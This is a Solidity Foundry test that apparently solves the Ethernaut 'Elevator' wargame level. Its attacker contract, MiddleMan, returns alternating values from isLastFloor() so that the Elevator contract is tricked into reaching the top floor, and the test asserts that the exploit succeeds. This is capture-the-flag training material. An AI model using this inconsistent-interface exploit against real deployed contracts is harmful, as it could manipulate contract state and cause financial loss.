// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Elevator.sol";

// inheritance + isLastFloor() returns differently each time
contract MiddleMan is Building {
    bool counter = true;

    function isLastFloor(uint256) external returns (bool) {
        counter = !counter;
        return counter;
    }

    function attack(Elevator elevator) public {
        elevator.goTo(1);
    }
}

contract ElevatorTest is Test {
    Elevator elevator;

    function setUp() public {
        elevator = new Elevator();
    }

    function test() public {
        assertEq(elevator.top(), false);

        MiddleMan middleMan = new MiddleMan();
        middleMan.attack(elevator);

        assertEq(elevator.top(), true);
    }
}
